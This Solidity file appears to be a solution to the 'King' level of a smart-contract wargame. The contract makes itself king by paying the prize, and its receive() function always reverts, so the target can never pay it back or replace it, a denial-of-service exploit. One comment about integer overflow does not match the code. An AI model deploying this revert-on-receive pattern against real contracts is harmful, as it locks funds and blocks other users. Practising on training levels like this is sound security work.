// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/King.sol';
import 'hardhat/console.sol';

contract Exploit {
    King public target;

    //uint256 overflow before solidity 0.8.0
    constructor (King _target) public payable {
        target = _target;
        address currKing = target._king();
        uint256 currPrize = target.prize();
        console.log("current king:%s, current prize:%s", currKing, currPrize);

        require(msg.value > currPrize, "insufficient fund to change owner");
        (bool success,) = address(target).call{value:currPrize}("");
        require(success, "fail to change owner");
        require(target._king() == address(this), "owner != exploiter");
    }

    receive() external payable{
        revert();
    }
}
